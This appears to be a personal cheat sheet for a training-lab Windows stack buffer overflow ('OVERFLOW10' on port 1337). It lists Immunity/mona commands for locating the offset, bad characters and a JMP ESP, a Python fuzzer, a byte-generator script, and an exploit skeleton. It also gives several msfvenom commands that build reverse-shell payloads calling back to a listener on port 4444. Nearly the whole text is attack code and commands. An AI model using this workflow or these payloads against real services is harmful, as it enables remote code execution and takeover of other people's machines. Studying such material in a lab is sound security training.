# Methods

## Buffer Overflow:

nc 10.10.9.228 1337

!mona config -set workingfolder c:\Users\admin\Desktop\patota

python3 fuzzer.py

/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l ###

exploit

!mona findmsp -distance DISTANCE == Find Offset

or

/usr/bin/msf-pattern_offset -l DISTANCE -q EIP Register

retn = BBBB

!mona bytearray -b "\x00"

!mona compare -f C:\Users\admin\Desktop\patota\bytearray.bin -a ESP

!mona jmp -r esp -cpb "\x00\x01"

retn = jmp

msfvenom -p windows/shell_reverse_tcp LHOST=10.9.1.255 LPORT=4444 EXITFUNC=thread -b "\x00" -f c

msfvenom -p windows/shell_reverse_tcp LHOST=10.9.1.255 LPORT=4444 -e x86/shikata_ga_nai -f py -b "\x00"

msfvenom -p windows/shell_reverse_tcp LHOST=10.9.1.255 LPORT=4444 -b "\x00" -f c

## Script Fuzzer
```
#!/usr/bin/env python3

import socket, time, sys

ip = "10.10.9.228"

port = 1337
timeout = 5
prefix = "OVERFLOW10 "

string = prefix + "A" * 100

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)
```

## Script Strings
```
#listRem = "\\x11".split("\\x")
#

for x in range(1, 256):
  #if "{:02x}".format(x) not in listRem:
    print("\\x" + "{:02x}".format(x), end='')
print()

```

## Exploit
```
import socket

ip = "10.10.9.228"
port = 1337

prefix = "OVERFLOW10 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```